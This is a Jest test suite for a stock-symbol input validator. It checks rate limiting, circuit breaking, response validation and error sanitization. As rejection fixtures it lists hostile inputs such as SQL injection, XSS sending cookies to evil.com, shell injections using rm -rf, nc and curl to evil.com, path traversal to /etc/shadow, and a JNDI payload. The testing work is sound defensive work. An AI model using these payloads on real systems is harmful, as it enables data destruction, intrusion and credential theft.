/**
 * Security Validator Test Suite
 * Comprehensive security testing for input validation and attack prevention
 */

import SecurityValidator, {
	SecurityValidator as SecurityValidatorClass,
} from "../SecurityValidator";

describe("SecurityValidator", () => {
	let validator: SecurityValidatorClass;

	beforeEach(() => {
		validator = SecurityValidator;
		validator.resetSecurityState();
	});

	afterEach(() => {
		validator.resetSecurityState();
	});

	describe("Symbol Validation", () => {
		describe("Valid Symbols", () => {
			test("should accept standard US stock symbols", () => {
				const validSymbols = ["AAPL", "MSFT", "GOOGL", "TSLA", "BRK", "A", "AA"];

				for (const symbol of validSymbols) {
					const result = validator.validateSymbol(symbol);
					expect(result.isValid).toBe(true);
					expect(result.sanitized).toBe(symbol.toUpperCase());
					expect(result.errors).toHaveLength(0);
				}
			});

			test("should accept and normalize lowercase symbols", () => {
				const result = validator.validateSymbol("aapl");
				expect(result.isValid).toBe(true);
				expect(result.sanitized).toBe("AAPL");
				expect(result.errors).toHaveLength(0);
			});

			test("should accept symbols with numbers", () => {
				const result = validator.validateSymbol("BRK2");
				expect(result.isValid).toBe(true);
				expect(result.sanitized).toBe("BRK2");
				expect(result.errors).toHaveLength(0);
			});
		});

		describe("Invalid Symbols - Security Attacks", () => {
			test("should reject SQL injection attempts", () => {
				const maliciousInputs = [
					"'; DROP TABLE stocks; --",
					"AAPL' OR '1'='1",
					"UNION SELECT * FROM users",
					"'; DELETE FROM accounts; --",
				];

				for (const input of maliciousInputs) {
					const result = validator.validateSymbol(input);
					expect(result.isValid).toBe(false);
					expect(result.errors).toContain("Symbol contains suspicious patterns");
				}
			});

			test("should reject XSS injection attempts", () => {
				const xssInputs = [
					'<script>alert("xss")</script>',
					"AAPL<img src=x onerror=alert(1)>",
					'"><script>document.location="http://evil.com"</script>',
					'javascript:alert("xss")',
				];

				for (const input of xssInputs) {
					const result = validator.validateSymbol(input);
					expect(result.isValid).toBe(false);
					expect(result.errors).toContain("Symbol contains suspicious patterns");
				}
			});

			test("should reject command injection attempts", () => {
				const commandInputs = [
					"AAPL; cat /etc/passwd",
					"AAPL && rm -rf /",
					"AAPL | nc evil.com 1234",
					"AAPL`whoami`",
					"AAPL$(ls -la)",
				];

				for (const input of commandInputs) {
					const result = validator.validateSymbol(input);
					expect(result.isValid).toBe(false);
					expect(result.errors).toContain("Symbol contains suspicious patterns");
				}
			});

			test("should reject path traversal attempts", () => {
				const pathInputs = [
					"../../../etc/passwd",
					"AAPL../config",
					"..\\windows\\system32",
					"/etc/shadow",
				];

				for (const input of pathInputs) {
					const result = validator.validateSymbol(input);
					expect(result.isValid).toBe(false);
					expect(
						result.errors.some(
							(err: string) =>
								err.includes("suspicious patterns") ||
								err.includes("Invalid symbol format")
						)
					).toBe(true);
				}
			});

			test("should reject null byte attacks", () => {
				const nullByteInputs = ["AAPL\0.txt", "AAPL\x00", "AAPL\u0000"];

				for (const input of nullByteInputs) {
					const result = validator.validateSymbol(input);
					expect(result.isValid).toBe(false);
					expect(result.errors).toContain("Symbol contains suspicious patterns");
				}
			});

			test("should reject Python dunder method attacks", () => {
				const dundeInputs = ["__init__", "__class__", "__import__", "__file__"];

				for (const input of dundeInputs) {
					const result = validator.validateSymbol(input);
					expect(result.isValid).toBe(false);
					expect(result.errors).toContain("Symbol contains suspicious patterns");
				}
			});
		});

		describe("Invalid Symbols - Format Validation", () => {
			test("should reject non-string inputs", () => {
				const nonStringInputs = [null, undefined, 123, {}, [], true];

				for (const input of nonStringInputs) {
					const result = validator.validateSymbol(input);
					expect(result.isValid).toBe(false);
					expect(result.errors).toContain("Symbol must be a string");
				}
			});

			test("should reject empty symbols", () => {
				const result = validator.validateSymbol("");
				expect(result.isValid).toBe(false);
				expect(result.errors).toContain("Symbol too short");
			});

			test("should reject overly long symbols", () => {
				const result = validator.validateSymbol("TOOLONG");
				expect(result.isValid).toBe(false);
				expect(result.errors).toContain("Symbol too long");
			});

			test("should reject symbols with special characters", () => {
				const specialChars = ["AAPL@", "MSFT#", "GOOGL$", "TSLA%", "AMZN^"];

				for (const symbol of specialChars) {
					const result = validator.validateSymbol(symbol);
					expect(result.isValid).toBe(false);
					expect(result.errors).toContain(
						"Invalid symbol format - must be 1-5 uppercase letters/numbers"
					);
				}
			});
		});
	});

	describe("Batch Symbol Validation", () => {
		test("should validate clean symbol batches", () => {
			const cleanBatch = ["AAPL", "MSFT", "GOOGL", "TSLA"];
			const result = validator.validateSymbolBatch(cleanBatch);

			expect(result.isValid).toBe(true);
			expect(JSON.parse(result.sanitized!)).toEqual(["AAPL", "MSFT", "GOOGL", "TSLA"]);
		});

		test("should reject non-array inputs", () => {
			const nonArrayInputs = [null, undefined, "AAPL", 123, {}];

			for (const input of nonArrayInputs) {
				const result = validator.validateSymbolBatch(input as any);
				expect(result.isValid).toBe(false);
				expect(result.errors).toContain("Symbols must be an array");
			}
		});

		test("should reject empty arrays", () => {
			const result = validator.validateSymbolBatch([]);
			expect(result.isValid).toBe(false);
			expect(result.errors).toContain("At least one symbol required");
		});

		test("should reject batches exceeding limits", () => {
			const largeBatch = Array(51).fill("AAPL");
			const result = validator.validateSymbolBatch(largeBatch);

			expect(result.isValid).toBe(false);
			expect(result.errors).toContain("Too many symbols - maximum 50 allowed");
		});

		test("should reject batches with duplicate symbols", () => {
			const duplicateBatch = ["AAPL", "MSFT", "AAPL"];
			const result = validator.validateSymbolBatch(duplicateBatch);

			expect(result.isValid).toBe(false);
			expect(result.errors).toContain("Duplicate symbols detected");
		});

		test("should reject batches containing malicious symbols", () => {
			const maliciousBatch = ["AAPL", "'; DROP TABLE stocks; --", "MSFT"];
			const result = validator.validateSymbolBatch(maliciousBatch);

			expect(result.isValid).toBe(false);
			expect(result.errors.some((err: string) => err.includes("Symbol 2:"))).toBe(true);
		});
	});

	describe("Numeric Validation", () => {
		test("should validate clean numeric inputs", () => {
			const validNumbers = [0, 1, 100.5, -50.25, 1000000];

			for (const num of validNumbers) {
				const result = validator.validateNumeric(num, {
					allowNegative: true,
					allowZero: true,
				});
				expect(result.isValid).toBe(true);
				expect(result.sanitized).toBe(num.toString());
			}
		});

		test("should validate string numbers", () => {
			const result = validator.validateNumeric("123.45");
			expect(result.isValid).toBe(true);
			expect(result.sanitized).toBe("123.45");
		});

		test("should reject non-numeric inputs", () => {
			const nonNumericInputs = ["abc", {}, [], null, undefined, NaN, Infinity, -Infinity];

			for (const input of nonNumericInputs) {
				const result = validator.validateNumeric(input);
				expect(result.isValid).toBe(false);
			}
		});

		test("should enforce range limits", () => {
			const result1 = validator.validateNumeric(5, { min: 10 });
			expect(result1.isValid).toBe(false);
			expect(result1.errors).toContain("Value must be at least 10");

			const result2 = validator.validateNumeric(15, { max: 10 });
			expect(result2.isValid).toBe(false);
			expect(result2.errors).toContain("Value must be at most 10");
		});

		test("should enforce negative/zero restrictions", () => {
			const result1 = validator.validateNumeric(-5, { allowNegative: false });
			expect(result1.isValid).toBe(false);
			expect(result1.errors).toContain("Negative values not allowed");

			const result2 = validator.validateNumeric(0, { allowZero: false });
			expect(result2.isValid).toBe(false);
			expect(result2.errors).toContain("Zero values not allowed");
		});

		test("should enforce decimal place limits", () => {
			const result = validator.validateNumeric(123.456789, { decimalPlaces: 2 });
			expect(result.isValid).toBe(false);
			expect(result.errors).toContain("Too many decimal places - maximum 2 allowed");
		});
	});

	describe("Rate Limiting", () => {
		test("should allow requests within rate limit", () => {
			const identifier = "test_service";

			for (let i = 0; i < 10; i++) {
				const result = validator.checkRateLimit(identifier);
				expect(result.allowed).toBe(true);
			}
		});

		test("should block requests exceeding rate limit", () => {
			const identifier = "test_service_limit";

			// Exhaust rate limit
			for (let i = 0; i < 100; i++) {
				validator.checkRateLimit(identifier);
			}

			// Next request should be blocked
			const result = validator.checkRateLimit(identifier);
			expect(result.allowed).toBe(false);
			expect(result.resetTime).toBeDefined();
		});
	});

	describe("Circuit Breaker", () => {
		test("should start in CLOSED state", () => {
			const identifier = "test_circuit";
			const result = validator.checkCircuitBreaker(identifier);

			expect(result.allowed).toBe(true);
			expect(result.state).toBe("CLOSED");
		});

		test("should open circuit after threshold failures", () => {
			const identifier = "test_circuit_failure";

			// Record failures to reach threshold
			for (let i = 0; i < 10; i++) {
				validator.recordFailure(identifier);
			}

			const result = validator.checkCircuitBreaker(identifier);
			expect(result.allowed).toBe(false);
			expect(result.state).toBe("OPEN");
		});

		test("should reset circuit on success", () => {
			const identifier = "test_circuit_recovery";

			validator.recordFailure(identifier);
			validator.recordSuccess(identifier);

			const result = validator.checkCircuitBreaker(identifier);
			expect(result.allowed).toBe(true);
			expect(result.state).toBe("CLOSED");
		});
	});

	describe("API Response Validation", () => {
		test("should validate clean API responses", () => {
			const cleanResponse = {
				symbol: "AAPL",
				price: 150.5,
				timestamp: Date.now(),
				source: "test",
			};

			const result = validator.validateApiResponse(cleanResponse, ["symbol", "price"]);
			expect(result.isValid).toBe(true);
		});

		test("should reject responses missing required fields", () => {
			const incompleteResponse = {
				symbol: "AAPL",
				// missing required 'price' field
			};

			const result = validator.validateApiResponse(incompleteResponse, ["symbol", "price"]);
			expect(result.isValid).toBe(false);
			expect(result.errors).toContain("Missing required field: price");
		});

		test("should reject responses with suspicious properties", () => {
			const maliciousResponse = {
				symbol: "AAPL",
				price: 150.5,
				__proto__: { evil: true },
				constructor: "hacked",
			};

			const result = validator.validateApiResponse(maliciousResponse, ["symbol"]);
			expect(result.isValid).toBe(false);
			expect(
				result.errors.some((err: string) => err.includes("Suspicious property detected"))
			).toBe(true);
		});

		test("should reject responses with excessively long strings", () => {
			const longStringResponse = {
				symbol: "AAPL",
				description: "A".repeat(15000), // Exceeds 10000 character limit
			};

			const result = validator.validateApiResponse(longStringResponse, ["symbol"]);
			expect(result.isValid).toBe(false);
			expect(result.errors).toContain("Excessively long string in field: description");
		});

		test("should reject non-object responses", () => {
			const nonObjectInputs = [null, undefined, "string", 123, []];

			for (const input of nonObjectInputs) {
				const result = validator.validateApiResponse(input, []);
				expect(result.isValid).toBe(false);
				expect(result.errors).toContain("Invalid response data structure");
			}
		});
	});

	describe("Error Message Sanitization", () => {
		test("should sanitize error messages in production", () => {
			const sensitiveError = new Error("API key: abc123, password: secret456, token: xyz789");
			const sanitized = validator.sanitizeErrorMessage(sensitiveError, true);

			expect(sanitized).not.toContain("abc123");
			expect(sanitized).not.toContain("secret456");
			expect(sanitized).not.toContain("xyz789");
			expect(sanitized).toContain("api_key=***");
			expect(sanitized).toContain("password=***");
			expect(sanitized).toContain("token=***");
		});

		test("should replace technical errors with user-friendly messages", () => {
			const technicalErrors = [
				{
					error: "ECONNREFUSED localhost:3000",
					expected: "Service temporarily unavailable",
				},
				{
					error: "Request timeout ETIMEDOUT",
					expected: "Request timeout - please try again",
				},
				{
					error: "Rate limit exceeded 429",
					expected: "Too many requests - please wait before trying again",
				},
				{ error: "Unauthorized 401", expected: "Authentication required" },
				{ error: "Forbidden 403", expected: "Access denied" },
			];

			for (const { error, expected } of technicalErrors) {
				const sanitized = validator.sanitizeErrorMessage(error, true);
				expect(sanitized).toBe(expected);
			}
		});

		test("should preserve error messages in development", () => {
			const error = new Error("Detailed debugging information with sensitive data");
			const sanitized = validator.sanitizeErrorMessage(error, false);

			expect(sanitized).toBe(error.message);
		});

		test("should limit message length in production", () => {
			const longError = "A".repeat(300);
			const sanitized = validator.sanitizeErrorMessage(longError, true);

			expect(sanitized.length).toBeLessThanOrEqual(203); // 200 + '...'
			expect(sanitized.endsWith("...")).toBe(true);
		});

		test("should handle non-Error inputs", () => {
			const inputs = ["string error", { message: "object error" }, 123, null, undefined];

			for (const input of inputs) {
				const sanitized = validator.sanitizeErrorMessage(input, true);
				expect(typeof sanitized).toBe("string");
				expect(sanitized.length).toBeGreaterThan(0);
			}
		});
	});

	describe("Security Status and Management", () => {
		test("should provide comprehensive security status", () => {
			const identifier = "status_test";
			validator.checkRateLimit(identifier);
			validator.recordFailure(identifier);

			const status = validator.getSecurityStatus();

			expect(status).toHaveProperty("rateLimits");
			expect(status).toHaveProperty("circuitBreakers");
			expect(status).toHaveProperty("totalRequests");
			expect(status.totalRequests).toBeGreaterThanOrEqual(1);
		});

		test("should reset security state cleanly", () => {
			const identifier = "reset_test";
			validator.checkRateLimit(identifier);
			validator.recordFailure(identifier);

			validator.resetSecurityState();

			const status = validator.getSecurityStatus();
			expect(status.totalRequests).toBe(0);
			expect(Object.keys(status.rateLimits)).toHaveLength(0);
			expect(Object.keys(status.circuitBreakers)).toHaveLength(0);
		});
	});

	describe("Integration Security Tests", () => {
		test("should handle complex attack vectors", () => {
			const complexAttacks = [
				"'; UNION SELECT api_key FROM config WHERE user='admin'--",
				'<script>fetch("http://evil.com/steal?data="+document.cookie)</script>',
				"${jndi:ldap://evil.com/exploit}",
				"AAPL||curl http://evil.com/$(whoami)",
				"../../../proc/self/environ",
				"\x00\x01\x02\x03\xFF\xFE",
			];

			for (const attack of complexAttacks) {
				const result = validator.validateSymbol(attack);
				expect(result.isValid).toBe(false);
				expect(result.errors.length).toBeGreaterThan(0);
			}
		});

		test("should maintain security under load", () => {
			const identifier = "load_test";
			const promises = [];

			// Simulate concurrent requests
			for (let i = 0; i < 50; i++) {
				promises.push(Promise.resolve(validator.checkRateLimit(identifier)));
			}

			return Promise.all(promises).then(results => {
				const allowedCount = results.filter(r => r.allowed).length;
				expect(allowedCount).toBeLessThanOrEqual(100); // Rate limit should be enforced
			});
		});
	});
});
